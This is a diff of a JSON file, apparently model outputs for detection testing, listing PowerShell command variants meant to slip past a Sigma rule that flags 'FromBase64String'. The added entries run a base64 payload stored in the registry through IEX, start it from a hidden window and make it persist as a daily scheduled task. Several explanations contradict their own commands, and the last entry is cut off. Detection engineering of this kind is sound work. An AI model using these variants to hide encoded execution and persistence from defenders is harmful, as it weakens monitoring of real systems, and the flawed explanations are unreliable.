@@ -1,30 +1,24 @@
+```json
 [
   {
-    "output": "powershell.exe -Command \"[Convert]::FromBase64String('SGVsbG8gV29ybGQ=')\"",
-    "explanation": "The original Sigma rule detects the use of 'FromBase64String' directly. This command uses the same function in a straightforward manner and would be flagged by the rule."
+    "output": "\"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\\Microsoft\\Windows\\CurrentVersion).Debug)))\"",
+    "explanation": "This command omits the explicit registry key name 'Debug' and uses a shorter path by omitting the registry hive prefix, while still using the FromBase64String function. It maintains the same behavior as the original but may evade detection by slightly altering the string pattern."
   },
   {
-    "output": "powershell.exe -Command \"[System.Convert]::FromBase64String( 'SGVsbG8gV29ybGQ=' )\"",
-    "explanation": "This command uses the fully qualified namespace [System.Convert] and adds extra spaces around the string argument. The rule still detects the 'FromBase64String' function, so this is not a bypass."
+    "output": "\"powershell.exe\" -Command \"IEX ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))\"",
+    "explanation": "This command uses the full namespace for [System.Text.Encoding] and [System.Convert] to avoid shorthand notations, which may not trigger the Sigma rule's string-based detection while maintaining the same functionality."
   },
   {
-    "output": "powershell.exe -Command \"$method = 'FromBase' + '64String'; [Convert]::$method('SGVsbG8gV29ybGQ=')\"",
-    "explanation": "This command uses string concatenation to construct the method name 'FromBase64String'. The rule detects the presence of 'FromBase64String' in the command line, so this is not a bypass."
+    "output": "\"C:\\WINDOWS\\system32\\cmd.EXE\" /c start /min \"\" powershell.exe -Command \"IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))\"",
+    "explanation": "This command uses double quotes around the PowerShell command and removes unnecessary spaces, making it slightly different in structure while preserving the same behavior and encoded payload execution."
   },
   {
-    "output": "powershell.exe -Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\\Microsoft\\Windows\\CurrentVersion Debug).Debug)))\"",
-    "explanation": "This command uses the 'FromBase64String' function as part of a more complex command. The rule detects the presence of 'FromBase64String', so this is not a bypass."
+    "output": "\"powershell.exe\" & { $Encoded = [Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test); IEX ([System.Text.Encoding]::ASCII.GetString($Encoded)) }",
+    "explanation": "This command reorders the operations and stores the decoded string in a variable before executing it, which changes the string pattern and may bypass the rule's detection based on direct function call detection."
   },
   {
-    "output": "powershell.exe -Command \"[Convert]::FromBase64String([System.Text.Encoding]::ASCII.GetBytes('SGVsbG8gV29ybGQ='))\"",
-    "explanation": "This command attempts to obfuscate the base64 string by using GetBytes, but the 'FromBase64String' function is still present and detectable by the rule."
+    "output": "\"cmd.exe\" /c reg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f & schtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))\" /sc daily /st 07:45",
+    "explanation": "This command uses a scheduled task to execute the encoded PowerShell command, which introduces additional obfuscation through task scheduling and may avoid direct detection of the FromBase64String function in the immediate command line."
   },
   {
-    "output": "powershell.exe -Command \"[Convert]::FromBase64String([System.Text.Encoding]::ASCII.GetString([System.Text.Encoding]::ASCII.GetBytes('SGVsbG8gV29ybGQ=')))\"",
-    "explanation": "This command adds an extra layer of obfuscation by converting the base64 string to bytes and back to a string. However, the 'FromBase64String' function is still present and detectable by the rule."
-  },
-  {
-    "output": "powershell.exe -Command \"[Convert]::FromBase64String([System.Text.Encoding]::ASCII.GetString([System.Text.Encoding]::ASCII.GetBytes([System.Text.Encoding]::ASCII.GetBytes('SGVsbG8gV29ybGQ='))))\"",
-    "explanation": "This command adds multiple layers of obfuscation by converting the base64 string to bytes multiple times. However, the 'FromBase64String' function is still present and detectable by the rule."
-  }
-]
+    "output": "\"powershell.exe\" & { $key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp
